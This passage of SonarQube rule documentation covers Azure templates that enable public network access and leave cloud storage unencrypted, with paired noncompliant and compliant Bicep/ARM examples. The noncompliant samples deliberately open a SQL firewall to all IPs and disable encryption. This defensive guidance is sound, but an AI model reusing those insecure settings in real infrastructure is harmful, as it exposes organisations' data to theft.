<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack">Wikipedia, Padding Oracle Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack">Wikipedia, Chosen-Ciphertext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack">Wikipedia, Chosen-Plaintext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Semantic_security">Wikipedia, Semantically Secure Cryptosystems</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding">Wikipedia, OAEP</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode">Wikipedia, Galois/Counter Mode</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=azureresourcemanager:S6329">
              azureresourcemanager:S6329
            </a>
          </td>
          <td>
            <details>
              <p>Enabling public network access to cloud resources can affect an organization’s ability to protect its data or internal operations from data theft
or disruption.</p>
<p>Depending on the component, inbound access from the Internet can be enabled via:</p>
<ul>
  <li> a boolean value that explicitly allows access to the public network. </li>
  <li> the assignment of a public IP address. </li>
  <li> database firewall rules that allow public IP ranges. </li>
</ul>
<p>Deciding to allow public access may happen for various reasons such as for quick maintenance, time saving, or by accident.</p>
<p>This decision increases the likelihood of attacks on the organization, such as:</p>
<ul>
  <li> data breaches. </li>
  <li> intrusions into the infrastructure to permanently steal from it. </li>
  <li> and various malicious traffic, such as DDoS attacks. </li>
</ul>
<h2>Ask Yourself Whether</h2>
<p>This cloud resource:</p>
<ul>
  <li> should be publicly accessible to any Internet user. </li>
  <li> requires inbound traffic from the Internet to function properly. </li>
</ul>
<p>There is a risk if you answered no to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Avoid publishing cloud services on the Internet unless they are intended to be publicly accessible, such as customer portals or e-commerce
sites.</p>
<p>Use private networks (and associated private IP addresses) and VPC peering or other secure communication tunnels to communicate with other cloud
components.</p>
<p>The goal is to prevent the component from intercepting traffic coming in via the public IP address. If the cloud resource does not support the
absence of a public IP address, assign a public IP address to it, but do not create listeners for the public IP address.</p>
<h2>Sensitive Code Example</h2>
<p>Using <code>publicNetworkAccess</code> to control access to resources:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
resource exampleSite 'Microsoft.Web/sites@2020-12-01' = {
  name: 'example-site'
  properties: {
    publicNetworkAccess: 'Enabled'
  }
}
</pre>
<pre data-diff-id="2" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "type": "Microsoft.Web/sites",
      "apiVersion": "2020-12-01",
      "name": "example-site",
      "properties": {
        "siteConfig": {
          "publicNetworkAccess": "Enabled"
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="3" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "type": "Microsoft.Web/sites",
      "apiVersion": "2020-12-01",
      "name": "example",
      "resources": [
        {
          "type": "config",
          "apiVersion": "2020-12-01",
          "name": "example-config",
          "properties": {
            "publicNetworkAccess": "Enabled"
          }
        }
      ]
    }
  ]
}
</pre>
<p>Using IP address ranges to control access to resources:</p>
<pre data-diff-id="4" data-diff-type="noncompliant">
resource exampleFirewall 'Microsoft.Sql/servers/firewallRules@2014-04-01' = {
  name: 'example-firewall'
  properties: {
    startIpAddress: '0.0.0.0'
    endIpAddress: '255.255.255.255'
  }
}
</pre>
<pre data-diff-id="5" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "type": "Microsoft.Sql/servers/firewallRules",
      "apiVersion": "2014-04-01",
      "name": "example-firewall",
      "properties": {
        "startIpAddress": "0.0.0.0",
        "endIpAddress": "255.255.255.255"
      }
    }
  ]
}
</pre>
<pre data-diff-id="6" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "type": "Microsoft.Sql/servers",
      "apiVersion": "2014-04-01",
      "name": "example-database",
      "resources": [
        {
          "type": "firewallRules",
          "apiVersion": "2014-04-01",
          "name": "example-firewall",
          "properties": {
            "startIpAddress": "0.0.0.0",
            "endIpAddress": "255.255.255.255"
          }
        }
      ]
    }
  ]
}
</pre>
<h2>Compliant Solution</h2>
<p>Using <code>publicNetworkAccess</code> to control access to resources:</p>
<pre data-diff-id="1" data-diff-type="compliant">
resource exampleSite 'Microsoft.Web/sites@2020-12-01' = {
  name: 'example-site'
  properties: {
    publicNetworkAccess: 'Disabled'
  }
}
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "type": "Microsoft.Web/sites",
      "apiVersion": "2020-12-01",
      "name": "example-site",
      "properties": {
        "siteConfig": {
          "publicNetworkAccess": "Disabled"
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="3" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "type": "Microsoft.Web/sites",
      "apiVersion": "2020-12-01",
      "name": "example-site",
      "resources": [
        {
          "type": "config",
          "apiVersion": "2020-12-01",
          "name": "example-config",
          "properties": {
            "publicNetworkAccess": "Disabled"
          }
        }
      ]
    }
  ]
}
</pre>
<p>Using IP address ranges to control access to resources:</p>
<pre data-diff-id="4" data-diff-type="compliant">
resource exampleFirewall 'Microsoft.Sql/servers/firewallRules@2014-04-01' = {
  name: 'example-firewall'
  properties: {
    startIpAddress: '192.168.0.0'
    endIpAddress: '192.168.255.255'
  }
}
</pre>
<pre data-diff-id="5" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "type": "Microsoft.Sql/servers/firewallRules",
      "apiVersion": "2014-04-01",
      "name": "example-firewall",
      "properties": {
        "startIpAddress": "192.168.0.0",
        "endIpAddress": "192.168.255.255"
      }
    }
  ]
}
</pre>
<pre data-diff-id="6" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "type": "Microsoft.Sql/servers",
      "apiVersion": "2014-04-01",
      "name": "example-database",
      "resources": [
        {
          "type": "firewallRules",
          "apiVersion": "2014-04-01",
          "name": "example-firewall",
          "properties": {
            "startIpAddress": "192.168.0.0",
            "endIpAddress": "192.168.255.255"
          }
        }
      ]
    }
  ]
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/using-instance-addressing.html">AWS Documentation</a> - Amazon EC2 instance IP
  addressing </li>
  <li> <a href="https://docs.aws.amazon.com/dms/latest/userguide/CHAP_ReplicationInstance.PublicPrivate.html">AWS Documentation</a> - Public and
  private replication instances </li>
  <li> <a href="https://docs.aws.amazon.com/vpc/latest/peering/what-is-vpc-peering.html">AWS Documentation</a> - VPC Peering </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/668">CWE-668 - Exposure of Resource to Wrong Sphere</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=azureresourcemanager:S6388">
              azureresourcemanager:S6388
            </a>
          </td>
          <td>
            <details>
              <p>Using unencrypted cloud storages can lead to data exposure. In the case that adversaries gain physical access to the storage medium they are able
to access unencrypted information.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The service contains sensitive information that could cause harm when leaked. </li>
  <li> There are compliance requirements for the service to store data encrypted. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt cloud storages that contain sensitive information.</p>
<h2>Sensitive Code Example</h2>
<p>For <a
href="https://learn.microsoft.com/en-us/azure/templates/microsoft.azurearcdata/sqlserverinstances/databases">Microsoft.AzureArcData/sqlServerInstances/databases</a>:</p>
<p>Disabled encryption on SQL service instance database:</p>
<pre data-diff-id="1201" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "databases/example",
      "type": "Microsoft.AzureArcData/sqlServerInstances/databases",
      "apiVersion": "2023-03-15-preview",
      "properties": {
        "databaseOptions": {
          "isEncrypted": false
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="1211" data-diff-type="noncompliant">
resource symbolicname 'Microsoft.AzureArcData/sqlServerInstances/databases@2023-03-15-preview' = {
  properties: {
    databaseOptions: {
      isEncrypted: false
    }
  }
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.compute/disks">Microsoft.Compute/disks</a>, encryption is disabled by
default.</p>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.compute/snapshots">Microsoft.Compute/snapshots</a>:</p>
<p>Disabled disk encryption with settings collection:</p>
<pre data-diff-id="402" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.Compute/snapshots",
      "apiVersion": "2022-07-02",
      "properties": {
        "encryptionSettingsCollection": {
          "enabled": false
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="412" data-diff-type="noncompliant">
resource symbolicname 'Microsoft.Compute/snapshots@2022-07-02' = {
  properties: {
    encryptionSettingsCollection: {
      enabled: false
    }
  }
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.compute/virtualmachines">Microsoft.Compute/virtualMachines</a>:</p>
<p>Disabled encryption at host level:</p>
<pre data-diff-id="101" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.Compute/virtualMachines",
      "apiVersion": "2022-11-01",
      "properties": {
        "securityProfile": {
          "encryptionAtHost": false
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="111" data-diff-type="noncompliant">
resource myName 'Microsoft.Compute/virtualMachines@2022-11-01' = {
  properties: {
    securityProfile: {
      encryptionAtHost: false
    }
  }
}
</pre>
<p>Disabled encryption for managed disk:</p>
<pre data-diff-id="102" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.Compute/virtualMachines",
      "apiVersion": "2022-11-01",
      "properties": {
        "storageProfile": {
          "dataDisks": [
            {
              "id": "myDiskId"
            }
          ]
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="112" data-diff-type="noncompliant">
resource myName 'Microsoft.Compute/virtualMachines@2022-11-01' = {
  properties: {
    storageProfile: {
      dataDisks: [
        {
          name: 'myDisk'
        }
      ]
    }
  }
}
</pre>
<p>Disabled encryption for OS disk:</p>
<pre data-diff-id="104" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.Compute/virtualMachines",
      "apiVersion": "2022-11-01",
      "properties": {
        "storageProfile": {
          "osDisk": {
            "encryptionSettings": {
              "enabled": false
            }
          }
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="114" data-diff-type="noncompliant">
resource myName 'Microsoft.Compute/virtualMachines@2022-11-01' = {
  properties: {
    storageProfile: {
      osDisk: {
        name: 'myDisk'
        encryptionSettings: {
          enabled: false
        }
      }
    }
  }
}
</pre>
<p>Disabled encryption for OS managed disk:</p>
<pre data-diff-id="105" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.Compute/virtualMachines",
      "apiVersion": "2022-11-01",
      "properties": {
        "storageProfile": {
          "osDisk": {
            "managedDisk": {
              "id": "myDiskId"
            }
          }
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="115" data-diff-type="noncompliant">
resource myName 'Microsoft.Compute/virtualMachines@2022-11-01' = {
  properties: {
    storageProfile: {
      osDisk: {
        name: 'myDisk'
        managedDisk: {
          id: 'myDiskId'
        }
      }
    }
  }
}
</pre>
<p>For <a
href="https://learn.microsoft.com/en-us/azure/templates/microsoft.compute/virtualmachinescalesets/virtualmachines">Microsoft.Compute/virtualMachineScaleSets</a>:</p>
<p>Disabled encryption at host level:</p>
<pre data-diff-id="201" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.Compute/virtualMachineScaleSets",
      "apiVersion": "2022-11-01",
      "properties": {
        "virtualMachineProfile": {
          "securityProfile": {
            "encryptionAtHost": false
          }
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="211" data-diff-type="noncompliant">
resource symbolicname 'Microsoft.Compute/virtualMachineScaleSets@2022-11-01' = {
  properties: {
    virtualMachineProfile: {
      securityProfile: {
        encryptionAtHost: false
      }
    }
  }
}
</pre>
<p>Disabled encryption for data disk:</p>
<pre data-diff-id="202" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.Compute/virtualMachineScaleSets",
      "apiVersion": "2022-11-01",
      "properties": {
        "virtualMachineProfile": {
          "storageProfile": {
            "dataDisks": [
              {
                "name": "myDataDisk"
              }
            ]
          }
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="212" data-diff-type="noncompliant">
resource symbolicname 'Microsoft.Compute/virtualMachineScaleSets@2022-11-01' = {
  properties: {
    virtualMachineProfile: {
      storageProfile: {
        dataDisks: [
          {
            name: 'myDataDisk'
          }
        ]
      }
    }
  }
}
</pre>
<p>Disabled encryption for OS disk:</p>
<pre data-diff-id="204" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.Compute/virtualMachineScaleSets",
      "apiVersion": "2022-11-01",
      "properties": {
        "virtualMachineProfile": {
          "storageProfile": {
            "osDisk": {
              "name": "myOsDisk"
            }
          }
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="214" data-diff-type="noncompliant">
resource symbolicname 'Microsoft.Compute/virtualMachineScaleSets@2022-11-01' = {
  properties: {
    virtualMachineProfile: {
      storageProfile: {
        osDisk: {
          name: 'myOsDisk'
        }
      }
    }
  }
}
</pre>
<p>For <a
href="https://learn.microsoft.com/en-us/azure/templates/microsoft.containerservice/managedclusters">Microsoft.ContainerService/managedClusters</a>:</p>
<p>Disabled encryption at host and set the disk encryption set ID:</p>
<pre data-diff-id="1101" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.ContainerService/managedClusters",
      "apiVersion": "2023-03-02-preview",
      "properties": {
        "agentPoolProfiles": [
          {
            "enableEncryptionAtHost": false
          }
        ]
      }
    }
  ]
}
</pre>
<pre data-diff-id="1111" data-diff-type="noncompliant">
resource symbolicname 'Microsoft.ContainerService/managedClusters@2023-03-02-preview' = {
  properties: {
    agentPoolProfiles: [
      {
        enableEncryptionAtHost: false
      }
    ]
  }
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.datalakestore/accounts">Microsoft.DataLakeStore/accounts</a>:</p>
<p>Disabled encryption for Data Lake Store:</p>
<pre data-diff-id="501" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.DataLakeStore/accounts",
      "apiVersion": "2016-11-01",
      "properties": {
        "encryptionState": "Disabled"
      }
    }
  ]
}
</pre>
<pre data-diff-id="511" data-diff-type="noncompliant">
resource symbolicname 'Microsoft.DataLakeStore/accounts@2016-11-01' = {
  properties: {
    encryptionState: 'Disabled'
  }
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.dbformysql/servers">Microsoft.DBforMySQL/servers</a>:</p>
<p>Disabled infrastructure double encryption for MySQL server:</p>
<pre data-diff-id="601" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.DBforMySQL/servers",
      "apiVersion": "2017-12-01",
      "properties": {
        "infrastructureEncryption": "Disabled"
      }
    }
  ]
}
</pre>
<pre data-diff-id="611" data-diff-type="noncompliant">
resource symbolicname 'Microsoft.DBforMySQL/servers@2017-12-01' = {
  properties: {
    infrastructureEncryption: 'Disabled'
  }
}
</pre>
<p>For <a
href="https://learn.microsoft.com/en-us/azure/templates/microsoft.dbforpostgresql/2017-12-01/servers">Microsoft.DBforPostgreSQL/servers</a>:</p>
<p>Disabled infrastructure double encryption for PostgreSQL server:</p>
<pre data-diff-id="701" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.DBforPostgreSQL/servers",
      "apiVersion": "2017-12-01",
      "properties": {
        "infrastructureEncryption": "Disabled"
      }
    }
  ]
}
</pre>
<pre data-diff-id="711" data-diff-type="noncompliant">
resource symbolicname 'Microsoft.DBforPostgreSQL/servers@2017-12-01' = {
  properties: {
    infrastructureEncryption: 'Disabled'
  }
}
</pre>
<p>For <a
href="https://learn.microsoft.com/fr-fr/azure/templates/microsoft.documentdb/cassandraclusters/datacenters">Microsoft.DocumentDB/cassandraClusters/dataCenters</a>:</p>
<p>Disabled encryption for a Cassandra Cluster datacenter’s managed disk and backup:</p>
<pre data-diff-id="901" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "cassandraClusters/example",
      "type": "Microsoft.DocumentDB/cassandraClusters/dataCenters",
      "apiVersion": "2023-04-15",
      "properties": {
        "diskCapacity": 4
      }
    }
  ]
}
</pre>
<pre data-diff-id="911" data-diff-type="noncompliant">
resource symbolicname 'Microsoft.DocumentDB/cassandraClusters/dataCenters@2023-04-15' = {
  name: 'string'
  parent: parent
  properties: {
    diskCapacity: 4
  }
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.hdinsight/clusters">Microsoft.HDInsight/clusters</a>:</p>
<p>Disabled encryption for data disk:</p>
<pre data-diff-id="1301" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.HDInsight/clusters",
      "apiVersion": "2021-06-01",
      "properties": {
        "computeProfile": {
          "roles": [
            {
              "encryptDataDisks": false
            }
          ]
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="1311" data-diff-type="noncompliant">
resource symbolicname 'Microsoft.HDInsight/clusters@2021-06-01' = {
  properties: {
    computeProfile: {
      roles: [
        {
          encryptDataDisks: false
        }
      ]
    }
  }
}
</pre>
<p>Disabled encryption for data disk at application level:</p>
<pre data-diff-id="1302" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "clusters/example",
      "type": "Microsoft.HDInsight/clusters/applications",
      "apiVersion": "2021-06-01",
      "properties": {
        "computeProfile": {
          "roles": [
            {
              "encryptDataDisks": false
            }
          ]
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="1312" data-diff-type="noncompliant">
resource symbolicname 'Microsoft.HDInsight/clusters/applications@2021-06-01' = {
  properties: {
    computeProfile: {
      roles: [
        {
          encryptDataDisks: false
        }
      ]
    }
  }
}
</pre>
<p>Disabled encryption for resource disk:</p>
<pre data-diff-id="1303" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.HDInsight/clusters",
      "apiVersion": "2021-06-01",
      "properties": {
        "diskEncryptionProperties": {
          "encryptionAtHost": false
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="1313" data-diff-type="noncompliant">
resource symbolicname 'Microsoft.HDInsight/clusters@2021-06-01' = {
  properties: {
    diskEncryptionProperties: {
      encryptionAtHost: false
    }
  }
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.kusto/clusters">Microsoft.Kusto/clusters</a>:</p>
<p>Disabled encryption for disk:</p>
<pre data-diff-id="1401" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.Kusto/clusters",
      "apiVersion": "2022-12-29",
      "properties": {
        "enableDiskEncryption": false
      }
    }
  ]
}
</pre>
<pre data-diff-id="1411" data-diff-type="noncompliant">
resource symbolicname 'Microsoft.Kusto/clusters@2022-12-29' = {
  properties: {
    enableDiskEncryption: false
  }
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.recoveryservices/vaults">Microsoft.RecoveryServices/vaults</a>:</p>
<p>Disabled encryption for disk:</p>
<pre data-diff-id="1501" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.RecoveryServices/vaults",
      "apiVersion": "2023-01-01",
      "properties": {
        "encryption": {
          "infrastructureEncryption": "Disabled"
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="1511" data-diff-type="noncompliant">
resource symbolicname 'Microsoft.RecoveryServices/vaults@2023-01-01' = {
  properties: {
    encryption: {
      infrastructureEncryption: 'Disabled'
    }
  }
}
</pre>
<p>Disabled encryption on infastructure for backup:</p>
<pre data-diff-id="1502" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "vaults/example",
      "type": "Microsoft.RecoveryServices/vaults/backupEncryptionConfigs",
      "apiVersion": "2023-01-01",
      "properties": {
        "infrastructureEncryptionState": "Disabled"
      }
    }
  ]
}
</pre>
<pre data-diff-id="1512" data-diff-type="noncompliant">
resource symbolicname 'Microsoft.RecoveryServices/vaults/backupEncryptionConfigs@2023-01-01' = {
  properties: {
    encryptionAtRestType: '{CustomerManaged | MicrosoftManaged}'
    infrastructureEncryptionState: 'Disabled'
  }
}
</pre>
<p>For <a
href="https://learn.microsoft.com/en-us/azure/templates/microsoft.redhatopenshift/openshiftclusters">Microsoft.RedHatOpenShift/openShiftClusters</a>:</p>
<p>Disabled disk encryption for master profile and worker profiles:</p>
<pre data-diff-id="1601" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.RedHatOpenShift/openShiftClusters",
      "apiVersion": "2022-09-04",
      "properties": {
        "masterProfile": {
          "encryptionAtHost": "Disabled"
        },
        "workerProfiles": [
          {
            "encryptionAtHost": "Disabled"
          }
        ]
      }
    }
  ]
}
</pre>
<pre data-diff-id="1611" data-diff-type="noncompliant">
resource symbolicname 'Microsoft.RedHatOpenShift/openShiftClusters@2022-09-04' = {
  properties: {
    masterProfile: {
      encryptionAtHost: 'Disabled'
    }
    workerProfiles: [
      {
        encryptionAtHost: 'Disabled'
      }
    ]
  }
}
</pre>
<p>For <a
href="https://learn.microsoft.com/en-us/azure/templates/microsoft.sqlvirtualmachine/sqlvirtualmachines">Microsoft.SqlVirtualMachine/sqlVirtualMachines</a>:</p>
<p>Disabled encryption for SQL Virtual Machine:</p>
<pre data-diff-id="801" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.SqlVirtualMachine/sqlVirtualMachines",
      "apiVersion": "2022-08-01-preview",
      "properties": {
        "autoBackupSettings": {
          "enableEncryption": false
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="811" data-diff-type="noncompliant">
resource symbolicname 'Microsoft.SqlVirtualMachine/sqlVirtualMachines@2022-08-01-preview' = {
  properties: {
    autoBackupSettings: {
      enableEncryption: false
    }
  }
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.storage/storageaccounts">Microsoft.Storage/storageAccounts</a>:</p>
<p>Disabled enforcing of infrastructure encryption for double encryption of data:</p>
<pre data-diff-id="1001" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.Storage/storageAccounts",
      "apiVersion": "2022-09-01",
      "properties": {
        "encryption": {
          "requireInfrastructureEncryption": false
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="1011" data-diff-type="noncompliant">
resource symbolicname 'Microsoft.Storage/storageAccounts@2022-09-01' = {
  properties: {
    encryption: {
      requireInfrastructureEncryption: false
    }
  }
}
</pre>
<p>For <a
href="https://learn.microsoft.com/en-us/azure/templates/microsoft.storage/storageaccounts/encryptionscopes?pivots=deployment-language-bicep">Microsoft.Storage/storageAccounts/encryptionScopes</a>:</p>
<p>Disabled enforcing of infrastructure encryption for double encryption of data at encryption scope level:</p>
<pre data-diff-id="1002" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "storageAccounts/example",
      "type": "Microsoft.Storage/storageAccounts/encryptionScopes",
      "apiVersion": "2022-09-01",
      "properties": {
        "requireInfrastructureEncryption": false
      }
    }
  ]
}
</pre>
<pre data-diff-id="1012" data-diff-type="noncompliant">
resource symbolicname 'Microsoft.Storage/storageAccounts/encryptionScopes@2022-09-01' = {
  properties: {
    requireInfrastructureEncryption: false
  }
}
</pre>
<h2>Compliant Solution</h2>
<p>For <a
href="https://learn.microsoft.com/en-us/azure/templates/microsoft.azurearcdata/sqlserverinstances/databases">Microsoft.AzureArcData/sqlServerInstances/databases</a>:</p>
<p>Enabled encryption on SQL service instance database:</p>
<pre data-diff-id="1201" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "databases/example",
      "type": "Microsoft.AzureArcData/sqlServerInstances/databases",
      "apiVersion": "2023-03-15-preview",
      "properties": {
        "databaseOptions": {
          "isEncrypted": true
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="1211" data-diff-type="compliant">
resource symbolicname 'Microsoft.AzureArcData/sqlServerInstances/databases@2023-03-15-preview' = {
  properties: {
    databaseOptions: {
      isEncrypted: true
    }
  }
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.compute/disks">Microsoft.Compute/disks</a>:</p>
<p>Enabled encryption for managed disk:</p>
<pre>
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.Compute/disks",
      "apiVersion": "2022-07-02",
      "properties": {
        "encryption": {
          "diskEncryptionSetId": "string",
          "type": "string"
        }
      }
    }
  ]
}
</pre>
<pre>
resource symbolicname 'Microsoft.Compute/disks@2022-07-02' = {
  properties: {
    encryption: {
      diskEncryptionSetId: 'string'
      type: 'string'
    }
  }
}
</pre>
<p>Enabled encryption through setting <a
href="https://learn.microsoft.com/en-us/azure/templates/microsoft.compute/disks?pivots=deployment-language-arm-template#encryptionsettingscollection-1">encryptionSettingsCollection</a>:</p>
<pre>
{
